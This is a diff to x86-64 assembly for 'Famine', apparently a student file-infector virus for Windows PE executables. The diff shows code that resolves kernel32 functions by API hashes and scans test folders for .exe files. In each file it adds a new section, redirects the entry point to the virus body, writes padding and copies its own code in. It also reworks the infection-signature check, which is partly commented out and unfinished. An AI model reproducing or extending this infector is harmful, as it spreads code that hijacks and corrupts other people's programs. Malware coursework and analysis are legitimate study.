@@ -17,6 +17,10 @@ section .text
 	global _verifyDot
 	global _setupNewSection
 	global _clearAndTerminate
+	global _writePadding
+	global _checkSignature
+	global AddNewSection
+	global _goBackDir
 
 ;------------------------------; ***EntryPoint***
 start:
@@ -29,6 +33,7 @@ start:
     jmp _get_address_table
 
 ;------------------------------; Data in .famine section
+; https://github.com/snus-b/Metasploit_Function_Hashes
 _address_table_hash:
     localAlloc_hash dd 0x528176EE; + 0x11 | 0x4
     localFree_hash  dd 0xEA61FCB1; + 0x15
@@ -47,10 +52,8 @@ _resources:
     folderToInfect1 db "C:\\tmp\\test\\", 0; + 0x45
     folderToInfect2 db "C:\\tmp\\test2\\", 0
     target db "*", 0; + 0x66
-    name db ".text", 0; + 0x68
-    dotdot			db	"..", 0 ; 0x6E
-    signature		db	"alca", 0 ; 0x71
-    ; signature db "Famine version 1.0 (c)oded by jdecorte-mbucci", 0
+    signature db "Famine version 1.0 (c)oded by jdecorte-mbucci", 0 ; 0x68
+	originalEntryPoint dd 0x00000000 ; 0x96
 ;------------------------------;
 
 _saveEntryPoint:
@@ -433,7 +436,6 @@ _closeHandleFile:
 
 
 _findNextFile:
-	
 	mov 	rcx, r13
 	mov 	rdx, r14
 	call 	QWORD [ds:r15 + 72]			; HANDLE hFile = FindNextFileA(hFile, &win32_find_dataa_struct)
@@ -516,22 +518,9 @@ _openCurrentFile:
 	cmp 	rax, 0 				; check if .exe
 	jne 	_freeCall
 
-	
-	xor 	rax, rax
-	mov 	eax, [rsi + 3Ch]
-	add 	rax, rsi
-	lea 	rax, [rax + 18h]
-	lea 	rax, [rax + 0xf0]
-	lea 	rax, [rax + 0xC]
-	mov 	eax, DWORD [ds:rax]
-	add 	rax, rsi
-	cmp 	DWORD [ds:rax], 0x61636C61	; verify signature
-	jz	_freeCall
-
 	mov 	QWORD [ss:rsp + 120], r13	; store HANDLE hFile onto the stack for later use
 	mov 	QWORD [ss:rsp + 112], r14	; store WIN32_FIND_DATAA struct onto the stack for later use
 	
-
 	xor 	r13, r13
 	xchg 	rdi, r13			; *** r13 : size of target file ***
 	push 	r12
@@ -550,7 +539,7 @@ _openCurrentFile:
 ;-------------------------------------------------------;
 
 ; Registers configuration at this moment:
-; rbx: this_code entrypoint / rsi: &target_copy / r12: sizeof(this_code) / r13: sizeof(target) / r14: HANDLE hFile / r15: &k32AddressTable
+; rbx: this_code entrypoint / rsi: &target_copy  / r13: sizeof(target) / r14: HANDLE hFile / r15: &k32AddressTable
 
 AddNewSection:
 	xor 	rax, rax
@@ -571,10 +560,31 @@ AddNewSection:
 
 	lea rax, [rax + rcx] ; rax: start of sections header table
 
+	; ** 
+	; xor rcx, rcx
+	; mov ecx, DWORD [rax + 0x10]
+	; mov DWORD [rbx + 0x96], ecx
+
 	pop rcx
 	imul rcx, rcx, 28h
 	add rax, rcx ; rax: pointer to the end of last section
 
+; _checkSignature:
+
+; 	mov r8, rax	
+; 	mov rcx, [rax - 28h + 14h]
+; 	add rcx, rsi
+; 	add rcx, 0x68
+; 	lea rdx, [rbx + 0x68]
+; 	call ft_strcmp
+; 	jz .continue
+; 	mov r13, QWORD [ss:rsp + 120]
+; 	mov r14, QWORD [ss:rsp + 112]
+; 	mov r12, r14
+; 	jmp _freeCall
+; 	.continue:
+; 	mov rax, r8
+	
 	; --------------------------------------------------------
 	; Here we create the new section
 	; --------------------------------------------------------
@@ -592,24 +602,11 @@ _setupSectionValue:
 	mov DWORD [rax + 0Ch], ecx ; VirtualAddress
 	mov DWORD [r11 + 10h], ecx ; AddressOfEntryPoint
 
-	; ** SizeOfRawData **
-	mov ecx, r12d
-	mov edx, DWORD [r11 + 24h] ; file Alignment
-	call _align_size
-	mov DWORD [rax + 10h], r12d ; SizeOfRawData
-
 	; ** VirtualSize **
-	mov ecx, r12d
+	mov ecx, end - start
 	mov edx, DWORD [r11 + 20h] ; section Alignment
 	call _align_size
 	mov DWORD [rax + 8h], ecx ; VirtualSize
-
-	; ** PointerToRawData **
-	mov ecx, DWORD [rax + 14h - 28h] ; rdx : lastsection.PointerToRawData
-	add ecx, DWORD [rax + 10h - 28h] ; rdx : lastsection.PointerToRawData + lastsection.SizeOfRawData
-	mov edx, DWORD [r11 + 24h] ; file Alignment
-	call _align_size
-	mov DWORD [rax + 14h], ecx ; PointerToRawData
 
 	; ** SizeOfImage **
 	mov ecx, DWORD [rax + 0Ch]
@@ -617,14 +614,24 @@ _setupSectionValue:
 	mov edx, DWORD [r11 + 20h]
 	call _align_size 
 	mov DWORD [r11 + 38h], ecx ; update optinalHeader.SizeOfImage + SizeOfRawData
-	; xor 	rax, rax
-	; mov 	DWORD [rcx], 0x61636C61		; write signature 'alca'
-	; add 	rax, 4
+	
+	; ** SizeOfRawData **
+	mov ecx, end - start
+	mov edx, DWORD [r11 + 24h] ; file Alignment
+	call _align_size
+	mov DWORD [rax + 10h], end - start ; SizeOfRawData
+
+	; ** PointerToRawData **
+	mov ecx, r13d
+	mov edx, DWORD [r11 + 24h] ; file Alignment
+	call _align_size
+	mov DWORD [rax + 14h], ecx ; PointerToRawData
+	mov r12, rcx
 
 _copyShellcode:
 	mov 	rcx, r14
 	call 	QWORD [ds:r15 + 56]		; Close old HANDLE used to read the file
-	
+
 	mov 	rcx, QWORD [ss:rsp + 112]
 	lea 	rcx, [rcx + 44]			; WIN32_FIND_DATAA->fileName
 	mov 	rdx, 0x00000000C0000000
@@ -642,12 +649,25 @@ _copyShellcode:
 	xor 	r9, r9
 	mov 	QWORD [ss:rsp + 0x20], r9
 	call 	QWORD [ds:r15 + 48]		; WriteFile(HANDLE hFile, LPVOID buffer, DWORD nNumberOfBytesToWrite, NULL, NULL)
-	
+_writePadding:
+
+	; write padding
+	mov rcx, 0x40         ; LPTR allocation type (zero-initialized memory)
+	mov rdx, 0x200          ; Size of buffer to allocate (number of null bytes)
+	call QWORD [ds:r15]   ; LocalAlloc(LPTR, size)
+
+	mov rcx, r14
+	mov rdx, rax
+	mov r8, r12
+	sub r8, r13
+	xor r9, r9
+	mov QWORD [ss:rsp + 0x20], r9
+	call QWORD [ds:r15 + 48]
+
 	; write shellcode
 	mov rcx, r14
 	mov rdx, rbx
-	mov r8, r12
-	add r8, 0x1000
+	mov r8, end - start
 	xor r9, r9
 	mov QWORD [ss:rsp + 0x20], r9
 	call QWORD [ds:r15 + 48]
@@ -743,10 +763,6 @@ _goBackDir:
 	call 	_retrieveDirectoryData
 	jmp	_findNextFile
 
-_clearAndTerminate:
-	xor 	rcx, rcx
-	call 	QWORD [ds:r15 + 16]
-
 
 
 
@@ -801,5 +817,23 @@ _align_size:
 	and 	ecx, edx
 	ret
 
+ft_strcmp:
+	mov eax, [rcx]
+	sub eax, [rdx]
+	jne .exit
+	cmp byte [rcx], 0 ; if s1 end
+	je .exit
+	cmp byte [rdx], 0 ; if s2 end
+	je .exit
+	inc rcx
+	inc rdx
+	jmp ft_strcmp
+.exit:
+	ret
 
+_clearAndTerminate:
+	xor 	rcx, rcx
+	; jmp		originalEntryPoint
+	call 	QWORD [ds:r15 + 16]
+	
 end:
